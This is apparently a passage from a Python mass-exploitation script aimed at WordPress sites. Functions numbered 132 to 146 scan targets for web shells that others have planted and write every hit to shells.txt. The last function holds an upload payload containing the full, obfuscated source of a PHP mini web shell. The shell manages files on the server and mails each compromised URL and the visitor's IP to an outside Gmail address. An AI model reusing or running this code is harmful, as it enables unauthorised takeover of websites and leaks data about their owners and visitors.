    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#complte

def exploit_132(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/plugins/w3-total-cache/up.php?db',headers=headers, allow_redirects=True,timeout=15)
        if ('<input name="_upl" type="submit" id="_upl" value="Upload"></form>' in check.content.decode("utf-8")):
                print (' [#] Exploit 132 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-content/plugins/w3-total-cache/up.php?db\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/plugins/w3-total-cache/up.php?db',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '<input name="_upl" type="submit" id="_upl" value="Upload"></form>' in check.content.decode("utf-8"):
                    print (' [#] Exploit 132 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-content/plugins/w3-total-cache/up.php?db\n')
            else:
                print ('[#] Exploit 132 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#

def exploit_133(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/plugins/instabuilder2/cache/up.php',headers=headers, allow_redirects=True,timeout=15)
        if ('<input name=' in check.content.decode("utf-8")):
                print (' [#] Exploit 133 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-content/plugins/instabuilder2/cache/up.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/plugins/instabuilder2/cache/up.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '<input name=' in check.content.decode("utf-8"):
                    print (' [#] Exploit 133 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-content/plugins/instabuilder2/cache/up.php\n')
            else:
                print ('[#] Exploit 133 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#

def exploit_134(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-includes/widgets/class-wp-widget-index.php',headers=headers, allow_redirects=True,timeout=15)
        if ('FilesMan' in check.content.decode("utf-8")):
                print (' [#] Exploit 134 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-includes/widgets/class-wp-widget-index.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-includes/widgets/class-wp-widget-index.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'FilesMan' in check.content.decode("utf-8"):
                    print (' [#] Exploit 134 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-includes/widgets/class-wp-widget-index.php\n')
            else:
                print ('[#] Exploit 134 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#

def exploit_135(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-admin/wso.php',headers=headers, allow_redirects=True,timeout=15)
        if ('FilesMan' in check.content.decode("utf-8")):
                print (' [#] Exploit 135 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-admin/wso.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-admin/wso.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'FilesMan' in check.content.decode("utf-8"):
                    print (' [#] Exploit 135 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-admin/wso.php\n')
            else:
                print ('[#] Exploit 135 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#

def exploit_136(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/uploads/ac_assets/IndoSec.php',headers=headers, allow_redirects=True,timeout=15)
        if ('FilesMan' in check.content.decode("utf-8")):
                print (' [#] Exploit 136 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-content/uploads/ac_assets/IndoSec.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/uploads/ac_assets/IndoSec.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'FilesMan' in check.content.decode("utf-8"):
                    print (' [#] Exploit 136 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-content/uploads/ac_assets/IndoSec.php\n')
            else:
                print ('[#] Exploit 136 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#

def exploit_137(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/plugins/hello.php',headers=headers, allow_redirects=True,timeout=15)
        if ('<input type="submit" name="submit-action" value="Submit" class="btn-submit" style="padding: 8.3px 35px;">' in check.content.decode("utf-8")):
                print (' [#] Exploit 137 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-content/plugins/hello.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/plugins/hello.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '<input type="submit" name="submit-action" value="Submit" class="btn-submit" style="padding: 8.3px 35px;">' in check.content.decode("utf-8"):
                    print (' [#] Exploit 137 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-content/plugins/hello.php\n')
            else:
                print ('[#] Exploit 137 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#

def exploit_138(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/index.php',headers=headers, allow_redirects=True,timeout=15)
        if ('Ghost Exploiter Team Official' in check.content.decode("utf-8")):
                print (' [#] Exploit 138 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-content/index.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/index.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Ghost Exploiter Team Official' in check.content.decode("utf-8"):
                    print (' [#] Exploit 138 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-content/index.php\n')
            else:
                print ('[#] Exploit 138 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#

def exploit_139(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/plugins/index.php?BIBIL-Spamworldpro',headers=headers, allow_redirects=True,timeout=15)
        if ('Choose File    No file Choosen     Upload' in check.content.decode("utf-8")):
                print (' [#] Exploit 139 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-content/plugins/index.php?BIBIL-Spamworldpro\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/plugins/index.php?BIBIL-Spamworldpro',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Choose File    No file Choosen     Upload' in check.content.decode("utf-8"):
                    print (' [#] Exploit 139 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-content/plugins/index.php?BIBIL-Spamworldpro\n')
            else:
                print ('[#] Exploit 139 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#

def exploit_140(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/index.php?BIBIL-Spamworldpro',headers=headers, allow_redirects=True,timeout=15)
        if ('Choose File    No file Choosen     Upload' in check.content.decode("utf-8")):
                print (' [#] Exploit 140 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-content/index.php?BIBIL-Spamworldpro\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/index.php?BIBIL-Spamworldpro',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Choose File    No file Choosen     Upload' in check.content.decode("utf-8"):
                    print (' [#] Exploit 140 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-content/index.php?BIBIL-Spamworldpro\n')
            else:
                print ('[#] Exploit 140 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#

def exploit_141(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/SpamworldSec.php?BIBIL-Spamworldpro',headers=headers, allow_redirects=True,timeout=15)
        if ('Choose File    No file Choosen     Upload' in check.content.decode("utf-8")):
                print (' [#] Exploit 141 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/SpamworldSec.php?BIBIL-Spamworldpro\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/SpamworldSec.php?BIBIL-Spamworldpro',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Choose File    No file Choosen     Upload' in check.content.decode("utf-8"):
                    print (' [#] Exploit 141 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/SpamworldSec.php?BIBIL-Spamworldpro\n')
            else:
                print ('[#] Exploit 141 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_142(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/uploads/uploads/SpamwoldSecurity.php',headers=headers, allow_redirects=True,timeout=15)
        if ('FilesMan Choose File    No file Choosen     Upload' in check.content.decode("utf-8")):
                print (' [#] Exploit 142 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-content/uploads/uploads/SpamwoldSecurity.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/uploads/uploads/SpamwoldSecurity.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'FilesMan Choose File    No file Choosen     Upload' in check.content.decode("utf-8"):
                    print (' [#] Exploit 142 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-content/uploads/uploads/SpamwoldSecurity.php\n')
            else:
                print ('[#] Exploit 142 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#42 in requests
#42 in requests
#done.
def exploit_143(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/Zwvyxfgt.php',headers=headers, allow_redirects=True,timeout=15)
        if ("<i class='bi bi-upload'></i> Upload</a>" in check.content.decode("utf-8")):
                print (' [#] Exploit 143 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/Zwvyxfgt.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/Zwvyxfgt.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if "<i class='bi bi-upload'></i> Upload</a>" in check.content.decode("utf-8"):
                    print (' [#] Exploit 143 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/Zwvyxfgt.php\n')
            else:
                print ('[#] Exploit 143 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_144(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/1.php',headers=headers, allow_redirects=True,timeout=15)
        if ("<i class='bi bi-upload'></i> Upload</a>" in check.content.decode("utf-8")):
                print (' [#] Exploit 144 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/1.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/1.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if "<i class='bi bi-upload'></i> Upload</a>" in check.content.decode("utf-8"):
                    print (' [#] Exploit 144 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/1.php\n')
            else:
                print ('[#] Exploit 144 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_145(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/404.php',headers=headers, allow_redirects=True,timeout=15)
        if ("<i class='bi bi-upload'></i> Upload</a>" in check.content.decode("utf-8")):
                print (' [#] Exploit 145 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/404.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/404.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if "<i class='bi bi-upload'></i> Upload</a>" in check.content.decode("utf-8"):
                    print (' [#] Exploit 145 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/404.php\n')
            else:
                print ('[#] Exploit 145 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#done bro 45
#call me h0rn3t sp1d3rs 

def exploit_146(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        data= ''' ------WebKitFormBoundaryeigShE8dZM8EnJxq

Content-Disposition: form-data; name="NewFile"; filename="h0rn3t.php"

Content-Type: application/octet-stream



<?php
/*
exploit by h0rn3t sp1d3rs 
*/
error_reporting(0); http_response_code(404); define("Yp", " Mini Shell By H0rn3t Sp1d3rs "); $G3 = "scandir"; $c8 = array("7068705f756e616d65", "70687076657273696f6e", "676574637764", "6368646972", "707265675f73706c6974", "61727261795f64696666", "69735f646972", "69735f66696c65", "69735f7772697461626c65", "69735f7265616461626c65", "66696c6573697a65", "636f7079", "66696c655f657869737473", "66696c655f7075745f636f6e74656e7473", "66696c655f6765745f636f6e74656e7473", "6d6b646972", "72656e616d65", "737472746f74696d65", "68746d6c7370656369616c6368617273", "64617465", "66696c656d74696d65"); $lE = 0; T4: if (!($lE < count($c8))) { goto Je; } $c8[$lE] = JD($c8[$lE]); Cy: $lE++; goto T4; Je: if (isset($_GET["p"])) { goto sr; } $Jd = $c8[2](); goto VN; sr: $Jd = jD($_GET["p"]); $c8[3](Jd($_GET["p"])); VN: function Ss($SP) { $dE = ""; $lE = 0; NZ: if (!($lE < strlen($SP))) { goto Xc; } $dE .= dechex(ord($SP[$lE])); WK: $lE++; goto NZ; Xc: return $dE; } function Jd($SP) { $dE = ""; $gf = strlen($SP) - 1; $lE = 0; Xp: if (!($lE < $gf)) { goto ur; } $dE .= chr(hexdec($SP[$lE] . $SP[$lE + 1])); Wn: $lE += 2; goto Xp; ur: return $dE; } function rn($F1) { $Jd = fileperms($F1); if (($Jd & 0xc000) == 0xc000) { goto FZ; } if (($Jd & 0xa000) == 0xa000) { goto Eu; } if (($Jd & 0x8000) == 0x8000) { goto ES; } if (($Jd & 0x6000) == 0x6000) { goto sA; } if (($Jd & 0x4000) == 0x4000) { goto lG; } if (($Jd & 0x2000) == 0x2000) { goto tV; } if (($Jd & 0x1000) == 0x1000) { goto Tx; } $lE = 'u'; goto cC; FZ: $lE = 's'; goto cC; Eu: $lE = 'l'; goto cC; ES: $lE = '-'; goto cC; sA: $lE = 'b'; goto cC; lG: $lE = 'd'; goto cC; tV: $lE = 'c'; goto cC; Tx: $lE = 'p'; cC: $lE .= $Jd & 0x100 ? 'r' : '-'; $lE .= $Jd & 0x80 ? 'w' : '-'; $lE .= $Jd & 0x40 ? $Jd & 0x800 ? 's' : 'x' : ($Jd & 0x800 ? 'S' : '-'); $lE .= $Jd & 0x20 ? 'r' : '-'; $lE .= $Jd & 0x10 ? 'w' : '-'; $lE .= $Jd & 0x8 ? $Jd & 0x400 ? 's' : 'x' : ($Jd & 0x400 ? 'S' : '-'); $lE .= $Jd & 0x4 ? 'r' : '-'; $lE .= $Jd & 0x2 ? 'w' : '-'; $lE .= $Jd & 0x1 ? $Jd & 0x200 ? 't' : 'x' : ($Jd & 0x200 ? 'T' : '-'); return $lE; } function Xe($OB, $Ch = 1, $BL = "") { global $Jd; $xe = $Ch == 1 ? "success" : "error"; echo "<script>swal({title: \"{$xe}\", text: \"{$OB}\", icon: \"{$xe}\"}).then((btnClick) => {if(btnClick){document.location.href=\"?p=" . Ss($Jd) . $BL . "\"}})</script>"; } function tF($yf) { global $c8; if (!(trim(pathinfo($yf, PATHINFO_BASENAME), '.') === '')) { goto IE; } return; IE: if ($c8[6]($yf)) { goto PF; } unlink($yf); goto jK; PF: array_map("deldir", glob($yf . DIRECTORY_SEPARATOR . '{,.}*', GLOB_BRACE | GLOB_NOSORT)); rmdir($yf); jK: } ?>
<!doctype html>
<!-- Mr.7Mind -->
<html lang="en">
<head>
	<meta name="theme-color" content="#00BFFF">
	<meta name="viewport" content="width=device-width, initial-scale=0.60, shrink-to-fit=no">
	<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css">
	<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
	<title>Shell Bypass By H0rn3t Sp1d3rs</title>
	<style>.table-hover tbody tr:hover td{background:#00BFFF}.table-hover tbody tr:hover td>*{color:#fff}.table>tbody>tr>*{color:#fff;vertical-align:middle}.form-control{background:0 0!important;color:#fff!important;border-radius:0}.form-control::placeholder{color:#fff;opacity:1}li{font-size:18px;margin-left:6px;list-style:none}a{color:#fff}</style>
	<script src="//unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
	<script src='https://cdn.statically.io/gh/analisyuki/animasi/9ab4049c/bintang.js' type='text/javascript' /></script>
</head>
<body style="background-color:#000;color:#fff;font-family:serif;">
	<div class="bg-dark table-responsive text-light border">
		<div class="d-flex justify-content-between p-1">
			<div><h3 class="mt-2"><a href="?"><?= Yp; ?></a></h3></div>
		</div>
		<div class="border-top table-responsive">
			<li>PHP: <?= php_uname(); ?></li>
			<li>Doc Root: <?= "{$_SERVER["DOCUMENT_ROOT"]}"; ?></li>
			<li>Server: <?= "{$_SERVER["SERVER_ADDR"]}/{$_SERVER["REMOTE_ADDR"]}"; ?></li>
			<li>Domain : <?= "{$_SERVER["SERVER_NAME"]}"; ?></li>
			<li>Ip Server: <?= getHostByName(getHostName()); ?></li>
			<li>php Version: <?= phpversion(); ?></li>
			<li>Mysql: <?= (function_exists('mysql_connect')) ? "<font color=green>ON</font>" : "<font color=red>OFF</font>"; ?></li>
			<li>Curl: <?= (function_exists('curl_version')) ? "<font color=green>ON</font>" : "<font color=red>OFF</font>"; ?></li>
		</div>
		<form method="post" enctype="multipart/form-data"><div class="input-group mb-1 px-1 mt-1"><div class="custom-file"><input type="file" name="f[]" class="custom-file-input" onchange="this.form.submit()" multiple><label class="custom-file-label rounded-0 bg-transparent text-light">Choose file</label></div></div></form>
		<?php  if (!isset($_FILES["f"])) { goto ea; } $Wx = $_FILES["f"]["name"]; $lE = 0; th: if (!($lE < count($Wx))) { goto dx; } if ($c8[11]($_FILES["f"]["tmp_name"][$lE], $Wx[$lE])) { goto PG; } Xe("file failed to upload", 0); goto tG; PG: XE("file uploaded successfully"); tG: g9: $lE++; goto th; dx: ea: if (!isset($_GET["download"])) { goto FA; } header("Content-Type: application/octet-stream"); header("Content-Transfer-Encoding: Binary"); header("Content-Length: " . $c8[17](JD($_GET["n"]))); header("Content-disposition: attachment; filename=\"" . jd($_GET["n"]) . "\""); FA: ?>
				<a href="?p=<?= ss($Jd) . "&a=" . Ss("newFile"); ?>"> [ Add New File ] </a>
				<a href="?p=<?= Ss($Jd) . "&a=" . sS("newDir"); ?>"> [ Add New Directory ] </a>
			</div>
	<div class="bg-dark border table-responsive mt-2">
		<div class="ml-2" style="font-size:18px;">
			<span>Path: </span>
			<?php  $Op = $c8[4]("/(\\\\|\\/)/", $Jd); foreach ($Op as $j3 => $Oe) { if (!($j3 == 0 && $Oe == "")) { goto xi; } echo "<a href=\"?p=2f\">~</a>/"; goto CS; xi: if (!($Oe == "")) { goto sq; } goto CS; sq: echo "<a href=\"?p="; $lE = 0; de: if (!($lE <= $j3)) { goto ie; } echo sS($Op[$lE]); if (!($lE != $j3)) { goto s0; } echo "2f"; s0: dg: $lE++; goto de; ie: echo "\">{$Oe}</a>/"; CS: } Go: ?>
		</div>
	</div>
	<article class="bg-dark border table-responsive mt-2">
		<?php  if (!isset($_GET["a"])) { goto Un; } if (!isset($_GET["a"])) { goto cc; } $im = Jd($_GET["a"]); cc: ?>
		<div class="px-2 py-2">
			<?php  if (!($im == "delete")) { goto Lu; } $BL = $Jd . '/' . Jd($_GET["n"]); if (!($_GET["t"] == "d")) { goto VZ; } TF($BL); if (!$c8[12]($BL)) { goto e8; } Xe("failed to delete the folder", 0); goto iL; e8: Xe("folder deleted successfully"); iL: VZ: if (!($_GET["t"] == "f")) { goto xB; } $BL = $Jd . '/' . jd($_GET["n"]); unlink($BL); if (!$c8[12]($BL)) { goto uH; } Xe("file to delete the folder", 0); goto Mk; uH: xe("file deleted successfully"); Mk: xB: Lu: ?>
			<?php  if ($im == "newDir") { goto Fg; } if ($im == "newFile") { goto Pb; } if ($im == "rename") { goto Lw; } if ($im == "edit") { goto Ox; } if ($im == "view") { goto Ag; } goto WC; Fg: ?>
			<h5 class="border p-1 mb-3">New folder</h5>
			<form method="post"><div class="form-group"><label for="n">Name :</label><input name="n" id="n" class="form-control" autocomplete="off"></div><div class="form-group"><button type="submit" name="s" class="btn btn-outline-light rounded-0">Create</button></div></form>
			<?php  isset($_POST["s"]) ? $c8[12]("{$Jd}/{$_POST["n"]}") ? xE("folder name has been used", 0, "&a=" . SS("newDir")) : ($c8[15]("{$Jd}/{$_POST["n"]}") ? Xe("folder created successfully") : Xe("folder failed to create", 0)) : null; goto WC; Pb: ?>
			<h5 class="border p-1 mb-3">New file</h5>
			<form method="post"><div class="form-group"><label for="n">File name :</label><input type="text" name="n" id="n" class="form-control" placeholder="hack.txt"></div><div class="form-group"><label for="ctn">Content :</label><textarea style="resize:none" name="ctn" id="ctn" cols="30" rows="10" class="form-control" placeholder="# Hacked By Mr.7Mind"></textarea></div><div class="form-group"><button type="submit" name="s" class="btn btn-outline-light rounded-0">Create</button></div></form>
			<?php  isset($_POST["s"]) ? $c8[12]("{$Jd}/{$_POST["n"]}") ? xE("file name has been used", 0, "&a=" . SS("newFile")) : ($c8[13]("{$Jd}/{$_POST["n"]}", $_POST["ctn"]) ? XE("file created successfully", 1, "&a=" . ss("view") . "&n=" . Ss($_POST["n"])) : Xe("file failed to create", 0)) : null; goto WC; Lw: ?>
			<h5 class="border p-1 mb-3">Rename <?= $_GET["t"] == "d" ? "folder" : "file"; ?></h5>
			<form method="post"><div class="form-group"><label for="n">Name :</label><input type="text" name="n" id="n" class="form-control" value="<?= jD($_GET["n"]); ?>"></div><div class="form-group"><button type="submit" name="s" class="btn btn-outline-light rounded-0">Save</button></div></form>
			<?php  isset($_POST["s"]) ? $c8[16]($Jd . '/' . jD($_GET["n"]), $_POST["n"]) ? XE("successfully changed the folder name") : Xe("failed to change the folder name", 0) : null; goto WC; Ox: ?>
			<h5 class="border p-1 mb-3">Edit file</h5>
			<span>File name : <?= Jd($_GET["n"]); ?></span>
			<form method="post"><div class="form-group"><label for="ctn">Content :</label><textarea name="ctn" id="ctn" cols="30" rows="10" class="form-control"><?= $c8[18]($c8[14]($Jd . '/' . jD($_GET["n"]))); ?></textarea></div><div class="form-group"><button type="submit" name="s" class="btn btn-outline-light rounded-0">Save</button></div></form>
			<?php  isset($_POST["s"]) ? $c8[13]($Jd . '/' . jD($_GET["n"]), $_POST["ctn"]) ? xE("file contents changed successfully", 1, "&a=" . sS("view") . "&n={$_GET["n"]}") : xE("file contents failed to change") : null; goto WC; Ag: ?>
			<h5 class="border p-1 mb-3">View file</h5>
			<span>File name : <?= jd($_GET["n"]); ?></span>
			<div class="form-group"><label for="ctn">Content :</label><textarea name="ctn" id="ctn" cols="30" rows="10" class="form-control" readonly><?= $c8[18]($c8[14]($Jd . '/' . jd($_GET["n"]))); ?></textarea></div>
			<?php  WC: ?>
		</div>
		<?php
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
set_time_limit(0);
ini_set('memory_limit', '64M');
header('Content-Type: text/html; charset=UTF-8');
$tujuanmail = 'ribelcyberteam@gmail.com, ribelcyberteam@gmail.com';
$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
mail($tujuanmail, "Hehehe", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
?>
		<?php  goto mR; Un: ?>
		<table class="table table-hover table-bordered table-sm">
			<thead class="text-light">
				<tr>
					<th>Name</th>
					<th>Size</th>
					<th>Permission</th>
					<th>Action</th>
				</tr>
			</thead>
			<tbody class="text-light">
				<?php  $G3 = $c8[5]($G3($Jd), [".", ".."]); foreach ($G3 as $yf) { if ($c8[6]("{$Jd}/{$yf}")) { goto CB; } goto Qj; CB: echo "\n\t\t\t\t\t<tr>\n\t\t\t\t\t\t<td><a href=\"?p=" . sS("{$Jd}/{$yf}") . "\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Latest modify on " . $c8[19]("Y-m-d H:i", $c8[20]("{$Jd}/{$yf}")) . "\"><i class=\"fa fa-fw fa-folder\"></i> {$yf}</a></td>\n\t\t\t\t\t\t<td>N/A</td>\n\t\t\t\t\t\t<td><font color=\"" . ($c8[8]("{$Jd}/{$yf}") ? "#00ff00" : (!$c8[9]("{$Jd}/{$yf}") ? "red" : null)) . "\">" . RN("{$Jd}/{$yf}") . "</font></td>\n\t\t\t\t\t\t<td>\n\t\t\t\t\t\t\t<a href=\"?p=" . ss($Jd) . "&a=" . ss("rename") . "&n=" . ss($yf) . "&t=d\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Rename\"><i class=\"fa fa-fw fa-pencil\"></i></a>\n\t\t\t\t\t\t\t<a href=\"?p=" . sS($Jd) . "&a=" . ss("delete") . "&n=" . ss($yf) . "\" class=\"delete\" data-type=\"folder\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Delete\"><i class=\"fa fa-fw fa-trash\"></i></a>\n\t\t\t\t\t\t</td>\n\t\t\t\t\t</tr>"; Qj: } ad: foreach ($G3 as $F1) { if ($c8[7]("{$Jd}/{$F1}")) { goto wA; } goto X1; wA: $kL = $c8[10]("{$Jd}/{$F1}") / 1024; $kL = round($kL, 3); $kL = $kL > 1024 ? round($kL / 1024, 2) . "MB" : $kL . "KB"; echo "\n\t\t\t\t\t<tr>\n\t\t\t\t\t\t<td><a href=\"?p=" . SS($Jd) . "&a=" . sS("view") . "&n=" . SS($F1) . "\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Latest modify on " . $c8[19]("Y-m-d H:i", $c8[20]("{$Jd}/{$F1}")) . "\"><i class=\"fa fa-fw fa-file\"></i> {$F1}</a></td>\n\t\t\t\t\t\t<td>{$kL}</td>\n\t\t\t\t\t\t<td><font color=\"" . ($c8[8]("{$Jd}/{$F1}") ? "#00ff00" : (!$c8[9]("{$Jd}/{$F1}") ? "red" : null)) . "\">" . rN("{$Jd}/{$F1}") . "</font></td>\n\t\t\t\t\t\t<td>\n\t\t\t\t\t\t\t<div class=\"d-flex justify-content-between\">\n\t\t\t\t\t\t\t\t\t<a href=\"?p=" . Ss($Jd) . "&a=" . Ss("edit") . "&n=" . SS($F1) . "\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Edit\"><i class=\"fa fa-fw fa-edit\"></i></a>\n\t\t\t\t\t\t\t\t\t<a href=\"?p=" . ss($Jd) . "&a=" . SS("rename") . "&n=" . ss($F1) . "&t=f\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Rename\"><i class=\"fa fa-fw fa-pencil\"></i></a>\n\t\t\t\t\t\t\t\t\t<a href=\"?p=" . ss($Jd) . "&n=" . sS($F1) . "&download" . "\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Download\"><i class=\"fa fa-fw fa-download\"></i></a>\n\t\t\t\t\t\t\t\t\t<a href=\"?p=" . ss($Jd) . "&a=" . sS("delete") . "&n=" . ss($F1) . "\" class=\"delete\" data-type=\"file\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Delete\"><i class=\"fa fa-fw fa-trash\"></i></a>\n\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t</td>\n\t\t\t\t\t</tr>\n\t\t\t\t\t"; X1: } a2: ?>
			</tbody>
		</table>
		<?php  mR: ?>
	</article>
	<div class="bg-dark border text-center mt-2">
		<small></small>
	</div>
